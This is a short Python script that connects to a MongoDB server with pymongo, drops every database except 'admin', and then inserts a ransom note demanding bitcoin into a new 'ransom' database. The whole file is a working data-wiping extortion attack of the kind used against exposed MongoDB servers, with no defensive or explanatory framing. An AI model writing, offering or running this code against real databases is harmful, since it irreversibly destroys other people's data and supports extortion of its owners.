from pymongo import MongoClient

client = MongoClient("mongodb://localhost:27017/")

if __name__ == '__main__':
    for db in client.list_database_names():
        if db != "admin":
            client.drop_database(db)
            print(f"Dropped database: {db}")

    print("All gone")

    new_db = client["ransom"]
    new_collection = new_db["message"]
    the_ransom = {"message":"SEND BITCOIN IF U EVER WANT TO SEE UR PRECIOUS DATA AGAIN, HAIL PUTIN"}
    new_collection.insert_one(the_ransom)